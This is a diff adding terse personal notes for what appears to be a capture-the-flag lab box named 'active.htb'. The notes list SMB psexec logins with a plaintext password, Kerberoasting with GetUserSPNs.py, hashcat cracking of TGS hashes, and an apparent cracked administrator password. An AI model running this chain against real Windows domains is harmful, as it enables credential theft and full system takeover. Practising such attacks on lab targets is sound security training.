@@ -1,0 +1,22 @@
+nmap -n -d -p445 --script=smb-psexec --script-args=smbuser=SVC_TGS,smbpass=GPPstillStandingStrong2k18,config=examples,host=10.10.10.100
+
+
+ psexec.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100 cmd.exe
+
+
+./smbclient.py  active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
+
+ smbclient \\\\10.10.10.100\\Users -U SVC_TGS%GPPstillStandingStrong2k18
+
+./GetUserSPNs.py -request  active.htb/SVC_TGS -outputfile hash.txt
+
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+hashcat -h | grep -i tgs
+ 
+hashcat -a 0 -m 13100 hashes /root/Desktop/desk1/rockyou.txt --force
+hashcat -m 13100 hash.txt /root/Desktop/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  --force
+
+psexec.py administrator@10.10.10.100 
+
+Ticketmaster1968
